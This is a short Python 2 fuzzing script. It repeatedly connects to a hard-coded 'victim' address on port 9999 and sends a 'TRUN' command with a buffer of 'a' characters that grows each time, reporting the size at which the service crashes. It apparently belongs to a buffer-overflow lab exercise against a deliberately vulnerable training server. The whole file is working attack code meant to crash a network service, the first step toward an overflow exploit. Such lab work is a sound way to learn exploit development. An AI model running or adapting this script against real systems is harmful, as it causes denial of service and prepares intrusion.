#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "a" * 100  #declaring buffer variable

while True:
	try:
		#Trying to connect to victim IP and port
		s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
		s.connect(('192.168.8.162' , 9999))

		#sending a msg and the buffer
		s.send(("TRUN /.:/" + buffer))
		s.close()
		sleep(1)

		#As long as there is a connection keep sending "a"s
		buffer += "a" * 100

	except:
		#Display where it crashed
		print "fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()

